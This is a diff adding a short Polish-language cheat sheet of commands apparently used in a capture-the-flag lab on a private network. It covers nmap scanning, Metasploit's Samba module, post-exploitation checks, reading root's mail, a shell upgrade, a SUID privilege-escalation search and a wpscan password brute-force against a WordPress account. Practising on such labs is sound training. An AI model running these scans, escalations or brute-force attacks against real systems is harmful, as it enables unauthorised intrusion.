@@ -1,0 +1,44 @@
+﻿Wykorzystywane komendy:
+
+
+nmap -sn 192.168.56.*		/ skanowanie dla znajdowania innych maszyn w sieci.
+
+nmap 192.168.56.* -sSV
+openvas-setup			/ dla uruchomienia skryptu inicjalizacyjnego openvas-setup 
+w celu zainicjowania wtyczek
+ 				i uruchomienia różnych usług
+ wymaganych przez OpenVAS
+
+
+/etc/init.d/nessusd start  	/uruchomienie nessusa
+msfconsole
+						/uruchamia metasploit
+search samba					/szukamy "samba" 
+use auxiliary/scanner/smb/smb_version		/ustawiamy wybrany exploit
+options						/partzymy jego opcje
+set rhosts 192.168.56.110			/ustawiamy host
+run						/uruchamiamy
+
+whoami			/sprawdzamy kim jesteśmy
+getuid			/ -||-
+cd /root		/wchodzimy dp katalogu
+pwd			/sprawdzamy w jakim katalogie jesteśmy
+ls			/sprawdzamy co jest w tym katalogie
+find / -name "flag*"			/szukamy "flag*"
+head -n 40 /var/spool/mail/root		/wyświetlamy 40 strok z wybranego dokumentu
+cat flag1.txt				/odpalamy plik
+shell							
+python -c 'import pty; pty.spawn("/bin/bash")'
+find / -perm -u=s -type f 2>/dev/null
+touch abc					/tworzymy plik abc
+dirb http://192.168.56.103/			/narzędzie dirb, przydatne dla stron internetowych
+
+
+wpscan --url http://192.168.56.103/wordpress/ -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt
+
+						//narzędzie wpscan (taki brutforce)
+
+
+
+
+
